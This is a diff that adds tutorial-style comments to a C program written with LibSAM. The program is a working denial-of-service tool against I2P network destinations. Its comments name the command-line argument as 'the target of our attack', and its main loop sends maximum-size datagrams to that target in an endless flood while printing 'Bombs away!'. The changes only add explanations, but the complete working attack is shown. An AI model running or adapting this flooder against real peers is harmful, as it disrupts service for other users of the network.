@@ -40,7 +40,8 @@
 #include "sam.h"
 
 /*
- * LibSAM callbacks
+ * LibSAM callbacks - functions in our code that are called by LibSAM when
+ * something happens
  */
 static void dgramback(const sam_sess_t *session, sam_pubkey_t dest, void *data,
 	size_t size);
@@ -48,31 +49,38 @@ static void diedback(sam_sess_t *session);
 static void logback(char *s);
 static void namingback(char *name, sam_pubkey_t pubkey, samerr_t result);
 
+/*
+ * Just some ugly global variables.  Don't do this in your program.
+ */
 bool gotdest = false;
 sam_pubkey_t dest;
 
 int main(int argc, char* argv[])
 {
+	/*
+	 * The target of our attack is specified on the command line
+	 */
 	if (argc != 2) {
 		fprintf(stderr, "Syntax: %s <b64dest|name>\n", argv[0]);
 		return 1;
 	}
 
+	/* Hook up the callback functions - required by LibSAM */
 	sam_dgramback = &dgramback;
 	sam_diedback = &diedback;
 	sam_logback = &logback;
 	sam_namingback = &namingback;
 
 	/*
-	 * This tool would be more destructive if multiple session were used, but
-	 * they aren't - at least for now.
+	 * This tool would be more destructive if multiple SAM session were used,
+	 * but they aren't - at least for now.
 	 */
-	sam_sess_t *session = NULL;
-	session = sam_session_init(session);
+	sam_sess_t *session = NULL;  /* set to NULL to have LibSAM do the malloc */
+	session = sam_session_init(session);  /* malloc and set defaults */
 
-	/* a tunnel length of 2 is the default - adjust to your preference */
+	/* Connect to the SAM server -- you can use either an IP or DNS name */
 	samerr_t rc = sam_connect(session, "localhost", 7656, "TRANSIENT",
-		SAM_DGRAM, 2);
+		SAM_DGRAM, 2);  /* the tunnel length of 2 can be adjusted to whatever */
 	if (rc != SAM_OK) {
 		fprintf(stderr, "SAM connection failed: %s\n", sam_strerror(rc));
 		sam_session_free(&session);
@@ -83,22 +91,31 @@ int main(int argc, char* argv[])
 	 * Check whether they've supplied a name or a base 64 destination
 	 *
 	 * Note that this is a hack.  Jrandom says that once certificates are added,
-	 * the length could be different depending on the certificate.
+	 * the length could be different depending on the certificate's size.
 	 */
 	if (strlen(argv[1]) == 516) {
 		memcpy(dest, argv[1], SAM_PUBKEY_LEN);
 		gotdest = true;
-	}
-	else
+	} else {
+		/*
+		 * If they supplied a name, we have to do a lookup on it.  This is
+		 * equivalent to doing a DNS lookup on the normal internet.  When the
+		 * lookup completes, we send them some data.
+		 */
 		sam_naming_lookup(session, argv[1]);
+	}
 
-	while (!gotdest)
+	while (!gotdest)  /* just wait for the naming lookup to complete */
 		sam_read_buffer(session);
 
 	char data[SAM_DGRAM_PAYLOAD_MAX];
-	memset(data, '#', SAM_DGRAM_PAYLOAD_MAX);
+	memset(data, '$', SAM_DGRAM_PAYLOAD_MAX);  /* We're sending them MONEY! */
 	size_t sentbytes = 0;
 	while (true) {
+		/*
+		 * Send them a flood of the largest sized datagrams possible in an
+		 * infinite loop!
+		 */
 		rc = sam_dgram_send(session, dest, data, SAM_DGRAM_PAYLOAD_MAX);
 		if (rc != SAM_OK) {
 			fprintf(stderr, "sam_dgram_send() failed: %s\n", sam_strerror(rc));
@@ -107,13 +124,23 @@ int main(int argc, char* argv[])
 		}
 		sentbytes += SAM_DGRAM_PAYLOAD_MAX;
 		printf("Bombs away! (%u kbytes sent so far)\n", sentbytes / 1024);
+		/*
+		 * sam_read_buffer() just checks for incoming activity from the SAM
+		 * session, and invokes the appropriate callbacks.  We aren't really
+		 * expecting any incoming activity here, but it is a good idea to check
+		 * anyway.
+		 */
 		sam_read_buffer(session);
 	}
 
-	sam_session_free(&session);
+	sam_session_free(&session); /* de-allocates memory used by the SAM session*/
 	return 0;
 }
 
+/*
+ * When we receive some data from another peer, just ignore it.  Denial of
+ * service programs don't need input ;)
+ */
 static void dgramback(const sam_sess_t *session, sam_pubkey_t dest, void *data,
 		size_t size)
 {
@@ -121,21 +148,34 @@ static void dgramback(const sam_sess_t *session, sam_pubkey_t dest, void *data,
 	free(data);
 }
 
+/*
+ * This is called whenever the SAM connection fails (like if the I2P router is
+ * shut down)
+ */
 static void diedback(sam_sess_t *session)
 {
 	fprintf(stderr, "Lost SAM connection!\n");
 	exit(1);
 }
 
+/*
+ * The logging callback prints any logging messages from LibSAM (typically
+ * errors)
+ */
 static void logback(char *s)
 {
 	fprintf(stderr, "LibSAM: %s\n", s);
 }
 
+/*
+ * This is really hackish, but we know that we are only doing one lookup, so
+ * what the hell
+ */
 static void namingback(char *name, sam_pubkey_t pubkey, samerr_t result)
 {
 	if (result != SAM_OK) {
 		fprintf(stderr, "Naming lookup failed: %s\n", sam_strerror(result));
+		/* high quality code would do a sam_session_free() here */
 		exit(1);
 	}
 	memcpy(dest, pubkey, SAM_PUBKEY_LEN);
